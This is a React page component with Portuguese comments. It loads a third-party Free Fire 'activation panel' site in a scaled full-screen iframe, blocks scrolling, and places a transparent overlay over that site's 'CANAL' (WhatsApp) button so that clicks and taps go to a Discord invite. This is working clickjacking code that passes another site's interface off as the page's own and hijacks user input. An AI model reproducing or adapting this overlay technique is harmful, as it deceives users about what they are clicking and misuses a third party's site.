import { useEffect, useRef, useState, useCallback } from "react";

export default function Home() {
  const [iframeReady, setIframeReady] = useState(false);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [isMobile, setIsMobile] = useState(false);

  // Detectar teclado virtual (viewport shrink)
  const [keyboardShift, setKeyboardShift] = useState(0);
  const initialHeightRef = useRef(window.innerHeight);

  const onIframeLoad = useCallback(() => {
    setIframeReady(true);
  }, []);

  useEffect(() => {
    const timer = setTimeout(() => setIframeReady(true), 5000);
    return () => clearTimeout(timer);
  }, []);

  // Detectar quando o teclado virtual sobe (viewport encolhe)
  useEffect(() => {
    const initialH = window.innerHeight;
    initialHeightRef.current = initialH;

    const handleResize = () => {
      const currentH = window.innerHeight;
      const diff = initialH - currentH;
      if (diff > 100) {
        const shiftPercent = (diff / initialH) * 100;
        setKeyboardShift(shiftPercent);
      } else {
        setKeyboardShift(0);
      }
    };

    window.addEventListener("resize", handleResize);
    const interval = setInterval(handleResize, 500);
    return () => {
      window.removeEventListener("resize", handleResize);
      clearInterval(interval);
    };
  }, []);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth < 768);
    checkMobile();
    window.addEventListener("resize", checkMobile);
    return () => window.removeEventListener("resize", checkMobile);
  }, []);

  // Bloquear scroll
  useEffect(() => {
    const handler = () => window.scrollTo(0, 0);
    const interval = setInterval(handler, 300);
    window.addEventListener("scroll", handler);
    return () => {
      clearInterval(interval);
      window.removeEventListener("scroll", handler);
    };
  }, []);

  // Scale e translateY do iframe
  const scaleVal = isMobile ? 1.09 : 1.08;
  const translateYBase = isMobile ? -18 : -20;
  const keyboardEffect = keyboardShift > 0 ? keyboardShift : 0;
  const translateYTotal = translateYBase + keyboardEffect * 0.5;

  // Handler para redirecionar para Discord
  const handleDiscordRedirect = useCallback(() => {
    window.location.href = "https://discord.gg/Bzmjkbt8yP";
  }, []);

  // Posição do overlay CANAL — cobre a área do botão CANAL
  // Botão CANAL fica na parte inferior do card, lado direito
  // No desktop (1280x768): botão está em ~y=700-750, x=740-870
  // Em percentuais: top ~65%, left ~52%, width ~14%, height ~5%
  const canalTop = isMobile ? 66 : 65;
  const canalLeft = isMobile ? 45 : 52;
  const canalWidth = isMobile ? 45 : 20;
  const canalHeight = isMobile ? 6 : 5;

  return (
    <div className="relative h-screen w-screen overflow-hidden bg-background select-none">

      {/* ===== CONTAINER DO IFRAME — escalado e reposicionado ===== */}
      <div
        className="absolute inset-0"
        style={{
          overflow: "hidden",
          zIndex: 1,
        }}
      >
        <div
          style={{
            transform: `scale(${scaleVal}) translateY(${translateYTotal}%)`,
            transformOrigin: "top center",
            width: "100%",
            height: "100%",
          }}
        >
          <iframe
            ref={iframeRef}
            src="https://freefireproxy.com.br/ativar"
            style={{ width: "100%", height: "100%", border: "none" }}
            title="Painel de Ativação"
            scrolling="no"
            onLoad={onIframeLoad}
          />
        </div>
      </div>

      {/* ===== OVERLAY INVISÍVEL SOBRE O CANAL (WHATSAPP) ===== */}
      {/* Sempre visível, cobrindo a área exata do botão CANAL */}
      <div
        style={{
          position: "fixed",
          top: `${canalTop}%`,
          left: `${canalLeft}%`,
          width: `${canalWidth}%`,
          height: `${canalHeight}%`,
          zIndex: 99999,
          cursor: "pointer",
          background: "transparent",
        }}
        onClick={(e) => {
          e.preventDefault();
          e.stopPropagation();
          (e as unknown as { nativeEvent: Event }).nativeEvent?.stopImmediatePropagation?.();
          handleDiscordRedirect();
        }}
        onTouchStart={(e) => {
          e.preventDefault();
          e.stopPropagation();
          handleDiscordRedirect();
          return false;
        }}
      />

      {/* Loading state */}
      {!iframeReady && (
        <div
          className="absolute inset-0 flex items-center justify-center"
          style={{ zIndex: 100000, background: "#060710" }}
        >
          <div className="flex flex-col items-center gap-3">
            <div className="h-6 w-6 animate-spin rounded-full border-2 border-blue-500/30 border-t-blue-500" />
            <p className="text-sm text-gray-400" style={{ fontFamily: "'Space Grotesk', sans-serif" }}>
              Carregando painel...
            </p>
          </div>
        </div>
      )}
    </div>
  );
}
